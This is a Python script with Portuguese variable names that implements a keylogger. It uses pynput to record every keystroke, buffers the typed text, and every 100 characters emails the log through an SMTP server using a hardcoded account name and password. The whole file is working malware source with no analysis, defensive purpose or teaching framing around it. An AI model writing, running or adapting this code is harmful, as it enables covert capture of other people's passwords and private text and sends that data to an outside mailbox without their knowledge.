import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

email = 'orlo32@ethereal.email'
senha = '7tG45c1Y1BA9Px9MNt'
smtp_server = 'smtp.ethereal.email'
smtp_port = 587
fullog = ''
palavras = ''
limite_caracteres_email = 100

def ao_pressionar(tecla):
    global palavras, fullog

    if tecla == Key.space or tecla == Key.enter:
        palavras += ' '
        fullog += palavras
        palavras = ''
        if len(fullog) >= limite_caracteres_email:
            enviar_log()
            fullog = ''
        return
    if tecla == Key.backspace:
        palavras = palavras[:-1]
        return
    if tecla == Key.shift or tecla == Key.shift_r or tecla == Key.shift_l:
        return
    if tecla == Key.esc:
        return False
    try:
        char = tecla.char if hasattr(tecla, 'char') and tecla.char else str(tecla)
        palavras += char
    except AttributeError:
        pass
def enviar_log():
    try:
        html = f"""
        <html>
        <body>
            <h2>Registro de Teclado</h2>
            <p>{fullog.replace('\n', '<br>').replace(' ', '&nbsp;')}</p>
        </body>
        </html>
        """

        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = email
        msg['Subject'] = 'Registro de Teclado'
        msg.attach(MIMEText(html, 'html'))

        # Conectar ao servidor SMTP e enviar o email
        with smtplib.SMTP(smtp_server, smtp_port) as servidor:
            servidor.starttls()  # Inicia STARTTLS
            servidor.login(email, senha)
            servidor.sendmail(email, email, msg.as_string())
    except Exception as e:
        print(f"Falha ao enviar o email: {e}")

with Listener(on_press=ao_pressionar) as ouvinte:
    ouvinte.join()